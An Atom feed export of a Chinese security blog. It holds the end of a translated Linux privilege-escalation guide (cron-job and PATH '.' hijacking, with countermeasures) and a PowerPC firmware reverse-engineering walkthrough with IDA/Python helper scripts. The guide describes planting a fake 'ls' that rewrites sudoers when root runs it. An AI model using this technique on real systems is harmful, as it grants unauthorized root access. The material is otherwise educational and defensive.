<div align="center"><br><img src="/img/20210820cronjobs_After5min.png" align><br></div>

<p><strong>对策：</strong></p>
<ul>
<li>cron 任务中定义的任何脚本或二进制文件都不应是可写的 </li>
<li>cron 文件不应被除 root 之外的任何人写入。 </li>
<li>cron.d 目录不应被除 root 之外的任何人写入。</li>
</ul>
<h3 id="6-_在PATH环境变量中使用’-’提权">6. 在PATH环境变量中使用’.’提权</h3><p>在您的 PATH 中包含“.”意味着用户能够从当前目录执行二进制文件/脚本。为了避免每次都输入这两个额外的字符，用户在他们的 PATH 中添加了“.”。这可能是攻击者提升其特权的绝佳方法。<br>假设 Susan 是管理员，她在路径中添加了“.”，这样她就不必再次写入这 2 个字符（./）。</p>
<p><strong>PATH中带有“.” - Program<br>PATH中没有“.” – ./program</strong></p>
<p>发生这种情况是因为在添加“.”后 Linux 首先在 PATH 开头搜索当前目录中的程序，然后搜索其他任何地方。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="blockquote">&gt; 另一个用户“rashid”知道 susan 在她的路径中添加了“.”，因为她很懒</span></span><br><span class="line"><span class="blockquote">&gt; rashid告诉susan “ls”命令在他的目录中不起作用</span></span><br><span class="line"><span class="blockquote">&gt; Rashid 在他的目录中添加了一个代码，该代码将更改 sudoers 文件并使他成为管理员</span></span><br><span class="line"><span class="blockquote">&gt; Rashid 将该代码存储在名为“ls”的文件中并使其可执行</span></span><br><span class="line"><span class="blockquote">&gt; 苏珊拥有 root 权限。她来了，在拉希德的主目录中执行“ls”命令</span></span><br><span class="line"><span class="blockquote">&gt; 使用 root 访问权限执行恶意代码，而不是原始的“ls”命令</span></span><br><span class="line"><span class="blockquote">&gt; 在保存为“ls”的文件中，添加了将打印“Hello world”的代码</span></span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820path_1.png" align><br></div>

<p><code>$ PATH=.:${PATH} – 在 PATH 变量中添加“.”</code></p>
<div align="center"><br><img src="/img/20210820path_2.png" align><br></div>

<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">ls</span> – 执行 ./<span class="keyword">ls</span> 文件而不是运行 <span class="keyword">list</span> 命令。</span><br><span class="line">&gt; 现在，如果 root 用户以 root 权限执行代码，我们可以实现以 root 权限执行任意代码。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820path_3.png" align><br></div>

<p>在这里，我们总结了对任何基于 Linux 的系统的成功提权攻击。现在你知道攻击者如何利用某些技术来提升他们的权限，你可以进一步利用这些技术来保护您的系统和应用程序免受入侵和攻击。</p>
<p><em>原文链接：<a href="https://payatu.com/guide-linux-privilege-escalation" target="_blank" rel="external">https://payatu.com/guide-linux-privilege-escalation</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x0_介绍">0x0 介绍</h2><p>应用或者进程获取的权限应该按照最小权限原则赋予，只授予执行各自功能最小权限。授予不需要的权限可能回导致权限滥用，同时权限提升也是检测恶意代码的一个重要指标。</p>
<h2 id="0x01_什么是权限提升？">0x01 什么是权限提升？</h2><p>大多数计算机系统被设计为供多个用户使用。权限是指允许用户做什么。常见权限包括查看和编辑文件、修改系统文件等。权限提升是指用户获得他们无权获得的权限。这些权限可用于删除文件、查看隐私信息或安装恶意程序（如病毒）。它通常发生在系统存在允许绕过系统安全机制漏洞时，或者系统设计假设存在缺陷时。<br>权限提升是利用操作系统或软件应用程序中的错误、设计缺陷或配置疏忽来获得应用程序或用户保护的资源的更高访问权限的行为。结果是应用程序拥有比执行未经授权操作的开发人员或系统管理员预期更多的权限。<br>虽然根据统计大部分公司使用的更多的是 Windows 客户端程序，但在考虑到公司的网络安全时，Linux 特权升级攻击则是需要应对的更大的威胁。公司的关键基础设施，例如 Web 服务器、数据库、防火墙等，很可能运行在 Linux 操作系统。对这些关键基础设施的损害有可能严重破坏组织的运营。此外，物联网 (IoT) 和嵌入式系统在工作场所变得无处不在，从而增加了恶意黑客的潜在目标数量。鉴于 Linux 设备在工作场所的流行，公司应该加强和保护这些设备。</p>]]>
    
    </summary>
    
      <category term="Linux" scheme="http://www.youngroe.com/tags/Linux/"/>
    
      <category term="提权" scheme="http://www.youngroe.com/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一次嵌入式固件逆向实践]]></title>
    <link href="http://www.youngroe.com/2021/03/20/IOT/powerpc_binary_blob_firmware_reverse/"/>
    <id>http://www.youngroe.com/2021/03/20/IOT/powerpc_binary_blob_firmware_reverse/</id>
    <published>2021-03-20T11:39:22.000Z</published>
    <updated>2021-11-03T14:38:05.770Z</updated>
    <content type="html"><![CDATA[<h2 id="0x0_简介">0x0 简介</h2><p><strong>本文已被看雪智能设备版本设置为精华文章：<a href="https://bbs.pediy.com/thread-266803.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-266803.htm</a></strong><br>获取到一个设备的固件，有6M，基本没在网上找到对该固件进行分析的文章，因此决定按照固件分析的一般思路对该固件进行逆向分析，实践学习下。主要用到的工具binwalk、ida pro 7.5、ghidra。首先使用binwalk获取固件基础信息，首先看下能不能提取出文件来：</p>
<div align="center"><br><img src="/img/firmware_binwalk_e.png" align><br></div>

<a id="more"></a>
<p>失败，猜测可能是个单文件固件或者有没有可能是个加密的固件，但明文字符串信息分布比较均匀，应该不是加密固件，再使用-A选项看看固件中的字节码信息。</p>
<div align="center"><br><img src="/img/firmware_binwalk_a.png" align><br></div>

<p>很明确了，扫描出来全是PowerPC大端指令，包括函数开始prologue、结束epilogue相关的指令。</p>
<h2 id="0x01_确定加载基地址">0x01 确定加载基地址</h2><p>首先使用32位ida pro对firmware进行反汇编，不过需要首先设定处理器类型，选择PowerPC big-endian。</p>
<div align="center"><br><img src="/img/firmware_ida_set.png" align><br></div>

<p>然后一路点确定，很遗憾ida pro没有自动分析，没有一个函数被识别出来，试试binwalk扫描出的函数prologue地址0x2004，跳转到这个地址按C键反汇编，可以自动识别关联的一些函数，查看字符串窗口也无法查看到对字符串的引用，猜测可能有两个原因：</p>
<ul>
<li>ida pro现在识别出的函数太少，很多函数还未识别出来，导致无引用</li>
<li>加载基地址不正确，导致引用地址错误，无法形成交叉引用<br>识别出来的函数太少，可以写一个脚本根据函数序言特征识别出函数头，再自动分析函数，特征码为94 21 FF ?? 7C 08 02 A6，binwalk中的识别码为0x7C0802A6（mflr r0），而ghidra可以直接自动分析。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROM:<span class="number">000020</span>EC <span class="number">94</span> <span class="number">21</span> FF F8                             stwu      r1, back_chain(r1)       <span class="comment">//开辟栈空间</span></span><br><span class="line">ROM:<span class="number">000020F</span>0 <span class="number">7</span>C <span class="number">08</span> <span class="number">02</span> A6                             mflr      r0                       <span class="comment">//</span></span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/firmware_ghirda.png" align><br></div>

<p>ghirda总共识别出来26000多个函数，应该识别出来差不多了，但是字符串仍然无法形成引用，要不然就是不正确，必须要解决基地址问题。</p>
<h3 id="方法一-通过跳转表特征确定基地址">方法一.通过跳转表特征确定基地址</h3><p>搜索powerpc固件加载基地址可以获取到一些信息，<a href="https://github.com/ilovepp/ppc_rebase" target="_blank" rel="external">ppc_rebase</a>运行可以得到一个基地址，但验证后发现不正确。通过参考其他资料，目前主要有四种固件基地址识别方法，具体参考<a href="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1018812112.nh&amp;dbcode=CDFD&amp;dbname=CDFDREF" target="_blank" rel="external">ARM设备固件装载基址定位的研究_朱瑞瑾</a>，然后通过学习PowerPC相关指令集<a href="https://bbs.pediy.com/thread-191928.htm" target="_blank" rel="external">PowerPC下C逆向指南</a>，发现PowerPC switch语句汇编实现中存在一个跳转表，通过跳转表及函数语句地址之间的关系可以计算出PowerPC固件基地址，具体参考脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="string">'''</span><br><span class="line">get powerpc big endin base addr by switch case jmp_table</span><br><span class="line">ROM:0000FAF4 28 03 00 07                             cmplwi    r3, 7</span><br><span class="line">ROM:0000FAF8 54 63 10 3A                             slwi      r3, r3, 2</span><br><span class="line">ROM:0000FAFC 3D 83 00 07                             addis     r12, r3, 7</span><br><span class="line">ROM:0000FB00 41 81 01 D0                             bgt       loc_FCD0</span><br><span class="line">ROM:0000FB04 81 6C FB 10                             lwz       r11, -0x4F0(r12)</span><br><span class="line">ROM:0000FB08 7D 69 03 A6                             mtctr     r11</span><br><span class="line">ROM:0000FB0C 4E 80 04 20                             bctr</span><br><span class="line">ROM:0000FB0C                         # ---------------------------------------------------------------------------</span><br><span class="line">ROM:0000FB10 00 06 FB 30                             .long unk_6FB30</span><br><span class="line">ROM:0000FB14 00 06 FB 54                             .long unk_6FB54</span><br><span class="line">ROM:0000FB18 00 06 FB 70                             .long unk_6FB70</span><br><span class="line">ROM:0000FB1C 00 06 FB A8                             .long unk_6FBA8</span><br><span class="line">ROM:0000FB20 00 06 FB C4                             .long unk_6FBC4</span><br><span class="line">ROM:0000FB24 00 06 FC 18                             .long unk_6FC18</span><br><span class="line">ROM:0000FB28 00 06 FC 34                             .long unk_6FC34</span><br><span class="line">ROM:0000FB2C 00 06 FC B8                             .long unk_6FCB8</span><br><span class="line">ROM:0000FB30                         # ---------------------------------------------------------------------------</span><br><span class="line">ROM:0000FB30 80 7F 01 68                             lwz       r3, 0x168(r31)</span><br><span class="line">ROM:0000FB34 48 01 D3 85                             bl        sub_2CEB8</span><br><span class="line">ROM:0000FB38 38 83 00 00                             addi      r4, r3, 0</span><br><span class="line">ROM:0000FB3C 38 7F 00 00                             addi      r3, r31, 0</span><br><span class="line"></span><br><span class="line">ida pro crtl+B  "7D ?? 03 A6 4E 80 04 20"  匹配查找到类似代码</span><br><span class="line">方法1：</span><br><span class="line">bctr 根据ctr寄存器值跳转</span><br><span class="line">mtctr r11 表示将r11的值加载到ctr寄存器</span><br><span class="line">r11 = 0x70000+r3*4-0x4F0，可以计算得到 当r3为0时，r11为0x6FB10 则ctr寄存器值也为0x6FB10</span><br><span class="line">则第一个跳转地址表实际所在的地址应该为0x6FB10，  0x6FB10 = base_addr + file_offset(0xFB10)</span><br><span class="line">可以计算base_addr = 0x6FB10 - 0xFB10</span><br><span class="line"></span><br><span class="line">方法2：</span><br><span class="line">最后一个跳转地址后面应该是第一个case语句跳转地址，这里的文件偏移为0xFB30</span><br><span class="line">在跳转地址表中找到最小的一个地址，这里为0x6FB30</span><br><span class="line">实际这两个地址应该相等，则 base_addr =  0x6FB30 - 0xFB30</span><br><span class="line"></span><br><span class="line">脚本实现的方法2，但是在某些固件中跳转地址表中的跳转地址不是绝对地址而是相对地址，脚本就无法通过方法二计算</span><br><span class="line">需要手动根据方法1计算</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ppc_base_by_switch_table</span><span class="params">(image_data, start_addr, max_gap=<span class="number">1</span>&lt;&lt;<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    通过跳转表首地址获取跳转地址表、第一个case语句地址</span><br><span class="line">    跳转地址表中的地址应该是紧凑的，有一个地址范围差max_gap，通过该条件可以获取到所有跳转地址</span><br><span class="line">    与最后一个跳转地址相邻的是第一个case语句的地址，如果基地址正确则该地址应该和跳转地址表中最小的地址相等</span><br><span class="line">    这里设置的基地址为0，则这两个地址之间的差值即为基地址</span><br><span class="line">    '''</span></span><br><span class="line">    offset = start_addr</span><br><span class="line">    gap = <span class="number">0</span></span><br><span class="line">    jmp_table_addr = struct.unpack_from(<span class="string">"&gt;i"</span>, image_data, offset)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> jmp_table_addr == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    jmp_table_addrs = []</span><br><span class="line">    <span class="keyword">while</span> gap &lt; max_gap:</span><br><span class="line">        jmp_table_addrs.append(jmp_table_addr)</span><br><span class="line">        offset = offset + <span class="number">4</span></span><br><span class="line">        addr = struct.unpack_from(<span class="string">"&gt;i"</span>, image_data, offset)[<span class="number">0</span>]</span><br><span class="line">        gap = abs(addr - jmp_table_addr)</span><br><span class="line">        jmp_table_addr = addr</span><br><span class="line">    jmp_table_addrs.sort()</span><br><span class="line">    file_loc1_addr = offset</span><br><span class="line">    true_loc1_addr = jmp_table_addrs[<span class="number">0</span>]</span><br><span class="line">    ppc_base = true_loc1_addr - file_loc1_addr</span><br><span class="line">    <span class="keyword">return</span> ppc_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_switch_code_addrs</span><span class="params">(image_data)</span>:</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    #ida 7D ?? 03 A6 4E 80 04 20</span><br><span class="line">    7D ?? 03 A6                             mtctr     rS          </span><br><span class="line">    4E 80 04 20                             bctr </span><br><span class="line">    通过switch语句字节码匹配查找固件中switch case跳转表首地址               </span><br><span class="line">    '''</span></span><br><span class="line">    re_switch_opcode = <span class="string">b"\x7d.&#123;1&#125;\x03\xA6\x4E\x80\x04\x20"</span>  </span><br><span class="line">    bytes_data = bytearray(image_data)</span><br><span class="line">    re_pattern = re.compile(re_switch_opcode)</span><br><span class="line">    addrs = []</span><br><span class="line">    <span class="keyword">for</span> match_obj <span class="keyword">in</span> re_pattern.finditer(bytes_data):</span><br><span class="line">        addrs.append(match_obj.start()+<span class="number">8</span>)                  <span class="comment">#7D ?? 03 A6 4E 80 04 20  len = 8</span></span><br><span class="line">    <span class="keyword">return</span> addrs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppc_base_count</span><span class="params">(ppc_bases)</span>:</span></span><br><span class="line">    freq_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ppc_base <span class="keyword">in</span> ppc_bases:</span><br><span class="line">        freq_dict[ppc_base] = freq_dict.get(ppc_base, <span class="number">0</span>) +<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> freq_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_success</span><span class="params">(ppc_bases)</span>:</span></span><br><span class="line">    ppc_base_freq = ppc_base_count(ppc_bases)</span><br><span class="line">    ppc_base_freq = sorted(ppc_base_freq.items(), key = <span class="keyword">lambda</span> kv:(kv[<span class="number">0</span>], kv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">for</span> base <span class="keyword">in</span> ppc_base_freq:</span><br><span class="line">        print(<span class="string">'%#x:%d'</span>%(base[<span class="number">0</span>], base[<span class="number">1</span>]))</span><br><span class="line">    print(<span class="string">"The rebase address is:%#x"</span>%ppc_base_freq[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_ppc_rebase</span><span class="params">(firmware_path)</span>:</span></span><br><span class="line">    f = open(firmware_path, <span class="string">"rb"</span>)</span><br><span class="line">    image_data = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    addrs = get_switch_code_addrs(image_data)</span><br><span class="line">    <span class="keyword">if</span> len(addrs) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"[-] error find switch table addrs"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    ppc_bases = []</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> addrs:</span><br><span class="line">        ppc_base = get_ppc_base_by_switch_table(image_data, addr)</span><br><span class="line">        <span class="keyword">if</span> ppc_base &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ppc_bases.append(ppc_base)</span><br><span class="line">    <span class="keyword">if</span> len(ppc_bases) &gt; <span class="number">0</span>:</span><br><span class="line">        print(firmware_path + <span class="string">" firmware base addr:\n"</span>)</span><br><span class="line">        print_success(ppc_bases)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"find rebase address failed, you can see the fllow addr use ida pro:"</span>)</span><br><span class="line">        <span class="keyword">for</span> inx, val <span class="keyword">in</span> enumerate(addrs):</span><br><span class="line">            <span class="keyword">if</span> inx &gt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">"%#x"</span>%(val-<span class="number">16</span>))</span><br><span class="line">        print(<span class="string">"press key C, find addi ra,rb, eg:addi r9, r11, 0x71A4 # 0x271A4"</span>)</span><br><span class="line">        print(<span class="string">"base = \"0x271A4\" - %#x"</span> %addrs[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"ppc_rebase.py firmware_path"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        usage()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        firmware_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(firmware_path):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            find_ppc_rebase(firmware_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/firmware_rebase_jmptable.png" align><br></div><br>关键是通过7D ?? 03 A6 4E 80 04 20特征码获取switch语句地址，然后根据地址关系可以计算出固件基地址为0x60000，设置基地址后字符串可以正常引用<br><br><div align="center"><br><img src="/img/firmware_ghirda_xerf.png" align><br></div>

<h3 id="方法二-通过字符串引用次数暴力搜索确定基地址">方法二.通过字符串引用次数暴力搜索确定基地址</h3><p>大概原理是首先获取固件中的字符串地址，然后通过设置不同的基地址测试该基地址下字符串的引用次数，引用次数越高说明该地址为基地址的概率越大，有一定的通用性，在readme中说对查找ARM固件效果比较好，我测试了两个PowePC固件都能正确获取到基地址，不过需要设置好参数，特别是大小端、字符串长度范围。由于是暴力搜索计算出来的所以比较费CPU，计算一次至少半小时起步，项目地址：<a href="https://github.com/sgayou/rbasefind" target="_blank" rel="external">https://github.com/sgayou/rbasefind</a></p>
<div align="center"><br><img src="/img/firmware_rebase_str_xerf.png" align><br></div>

<h2 id="0x02_IDA_Pro反编译函数">0x02 IDA Pro反编译函数</h2><p>设置正确的基地址后，ghirda基本可以正常进行静态反汇编分析了，也有伪代码功能，但是用得不熟悉、插件貌似也很少，还是习惯ida pro，但是ida不能自动反汇编，必须手动make code，下面通过两种方法使ida反编译函数。</p>
<h3 id="方法一-借用ghirda反汇编结果">方法一.借用ghirda反汇编结果</h3><p>可以将ghirda反汇编得函数地址信息导出，然后使用脚本导入到ida中make code。<br>ghirda中导出函数列表方法：Window-&gt;Functions 在Functions窗口右键Export-&gt;Export to CSV保存。<br>ida中导入ghirda函数脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">ida pro 7.5  python3</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_funcs_addr</span><span class="params">(csv_path)</span>:</span></span><br><span class="line">    starts = []</span><br><span class="line">    <span class="keyword">with</span> open(csv_path, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        reader = csv.DictReader(file)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">            start = int(row[<span class="string">'Location'</span>], <span class="number">16</span>)</span><br><span class="line">            starts.append(start)</span><br><span class="line">    <span class="keyword">return</span> starts</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_ida_funcs</span><span class="params">(starts)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> index, start <span class="keyword">in</span> enumerate(starts):</span><br><span class="line">        ida_funcs.add_func(start)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    file_path=ida_kernwin.ask_file(<span class="number">1</span>, <span class="string">"*"</span>, <span class="string">"ghidra export functions csv file path"</span>)</span><br><span class="line">    starts = get_funcs_addr(file_path)</span><br><span class="line">    add_ida_funcs(starts)</span><br><span class="line">    print(<span class="string">"[+] done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>只需要填入ghirda导出的csv文件路径即可。</p>
<div align="center"><br><img src="/img/firmware_ida_functions.png" align><br></div>

<h3 id="方法二-使用PowerPC函数序言prologue特征码">方法二.使用PowerPC函数序言prologue特征码</h3><p>大部分编译器编译生成的函数头可能会有一些固定的指令，如x86平台的mov edi, edi;push ebp，这种情况在PowerPc也存在PowerPC特征码为stwu rS,rD(n);mflr r0,我们可以利用这个特征编写ida python脚本使ida开始自动反编译固件生成函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_ida</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">ida pro 7.5  python3</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_func_prologue</span><span class="params">(file_path, pattern)</span>:</span></span><br><span class="line">    f = open(file_path, <span class="string">"rb"</span>)</span><br><span class="line">    image_data = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    bytes_data = bytearray(image_data)</span><br><span class="line">    re_pattern = re.compile(pattern)</span><br><span class="line">    addrs = []</span><br><span class="line">    <span class="keyword">for</span> match_obj <span class="keyword">in</span> re_pattern.finditer(bytes_data):</span><br><span class="line">        addrs.append(match_obj.start())</span><br><span class="line">    <span class="keyword">return</span> addrs</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auto_make_function</span><span class="params">(prolog_addrs)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> prolog_addrs:</span><br><span class="line">        ida_funcs.add_func(ida_ida.inf_get_min_ea() + addr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ppc_prologue = <span class="string">b"\x94.&#123;2&#125;\xF8\x7C\x08\x02\xA6"</span></span><br><span class="line">    file_path=ida_kernwin.ask_file(<span class="number">1</span>, <span class="string">"*"</span>, <span class="string">"firmware path"</span>)</span><br><span class="line">    addrs = find_func_prologue(file_path, ppc_prologue)</span><br><span class="line">    print(<span class="string">"[+] find %d func prologue"</span>%len(addrs))</span><br><span class="line">    auto_make_function(addrs)</span><br><span class="line">    print(<span class="string">"[+] done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>其实在github发现一个类似的脚本(<a href="https://github.com/maddiestone/IDAPythonEmbeddedToolkit/blob/master/define_code_functions.py)，但是这个是针对ida" target="_blank" rel="external">https://github.com/maddiestone/IDAPythonEmbeddedToolkit/blob/master/define_code_functions.py)，但是这个是针对ida</a> 7.0编写的，本来想移植过来的，折腾了下最后还是自己写一个简单点。</p>
<h2 id="0x03_通过sig优化库函数识别">0x03 通过sig优化库函数识别</h2><p>由于固件文件并不像PE、ELF文件有导入表，ida中也没有内置的sig文件，所有的函数都必须靠自己人工识别，工作量太大了，不过强大的ida pro可以自己创建sig文件，经过一番折腾，可以识别libc中一些字符串处理的函数，这里列以下尝试了哪些方法。</p>
<ul>
